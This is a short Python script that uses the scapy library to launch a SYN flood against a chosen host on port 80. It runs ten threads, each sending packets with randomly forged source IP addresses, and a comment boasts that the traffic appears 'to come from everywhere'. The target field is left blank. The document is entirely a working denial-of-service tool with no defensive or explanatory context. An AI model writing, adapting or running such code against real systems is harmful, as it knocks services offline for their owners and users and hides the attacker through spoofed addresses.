#!/usr/bin/env python

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import threading

target = ""
port = 80

def flood():
	for x in range(100):
		#so it appears to come from everywhere :D
		culprits = "%i.%i.%i.%i"%(random.randint(1,254), random.randint(1,254), random.randint(1,254), random.randint(1,254))
		send(IP(dst=target, src=culprits)/TCP(sport=RandShort(), dport=port, flags="S"), verbose=0)
		
for i in range(10):
	threading.Thread(target=flood).start()

